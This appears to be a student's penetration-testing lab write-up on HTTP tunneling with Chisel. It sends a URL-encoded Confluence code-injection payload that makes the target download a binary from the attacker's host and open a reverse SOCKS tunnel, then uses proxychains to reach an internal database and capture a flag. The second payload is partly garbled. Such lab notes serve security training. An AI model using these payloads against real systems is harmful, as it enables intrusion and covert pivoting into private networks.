
# HTTP Tunneling


2. Start VM Group 2. Download **/exercises/chisel_exercise_client** from CONFLUENCE01 (**192.168.239.63**). There's a server running on port 8008 on PGDATABASE01 (**10.4.239.215**).
   Set up a port forward using Chisel that allows you to run **chisel_exercise_client** against port 8008 on PGDATABASE01.

- Get file
```bash
wget http://192.168.239.63:8090/exercises/chisel_exercise_client
	--2024-06-25 19:04:17--  http://192.168.239.63:8090/exercises/chisel_exercise_client
	Connecting to 192.168.239.63:8090... connected.
	HTTP request sent, awaiting response... 200 
	Length: 1026416 (1002K)
	Saving to: ‘chisel_exercise_client’
	
	chisel_exercise_client  100%[=============================================================================================>] 1002K 1.42MB/s in 0.7s 
	
	2024-06-25 19:04:18 (1.42 MB/s) - ‘chisel_exercise_client’ saved [1026416/1026416]


chmod +x chisel_exercise_client
```

- Download compatible version of chisel, make executable, serve up
```bash
# Download v1.8.1 (working in ~/exercises/forward_tunnel dir)
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
	...
	chisel_1.8.1_linux_amd64.gz  100%[============================================================================>]   3.33M  --.-KB/s    in 0.1s
	...

# Unzip v1.8.1
gunzip chisel_1.8.1_linux_amd64.gz

# Rename
mv chisel_1.8.1_linux_amd64 chisel

# Make executable
chmod +x chisel

# Server
python3 -m http.server 80
```

- Set up Reverse Port Forward Server on Kali
```bash
chisel server --port 8080 --reverse
	2024/06/24 21:16:49 server: Reverse tunnelling enabled
	2024/06/24 21:16:49 server: Fingerprint eqnhO59Dz8gJ4de6b2Kvvnbv1X/QhAPgs8v4PsyBhck=
	2024/06/24 21:16:49 server: Listening on http://0.0.0.0:8080
```

- Send payload to CONFLUENCE01 to:
	1. Download chisel, Store it in /tmp/, & Make Executable
	2. Initiate a reverse port forward
```bash
# 1.
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.166/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

# 2.
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.g%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.166:8080%20R:socks%20%26%3Ert%28%29%22%29%7D/
```

- Verify via our chisel server
```bash
	2024/06/25 19:08:25 server: session#1: Client version (1.8.1) differs from server version (1.9.1-0kali1)
	2024/06/25 19:08:25 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
	- NOTE the tun is set to 127.0.0.1:1080

- Set proxychains config file
```bash
sudo vim /etc/proxychains4.conf

	socks5  127.0.0.1 1080
```
	- NOTE we set the same port as the Reverse Proxy seen above


- Run `chisel_exercise_client` via proxychains against PGDATABASE01
```bash
proxychains4 ./chisel_exercise_client -i 10.4.239.215 -p 8008
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	Connecting to 10.4.239.215:8008
	[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.4.239.215:8008  ...  OK
	Flag: "OS{bec052233ff6ca0ebd989fcde4d587ec}"
```



# DNS Tunneling

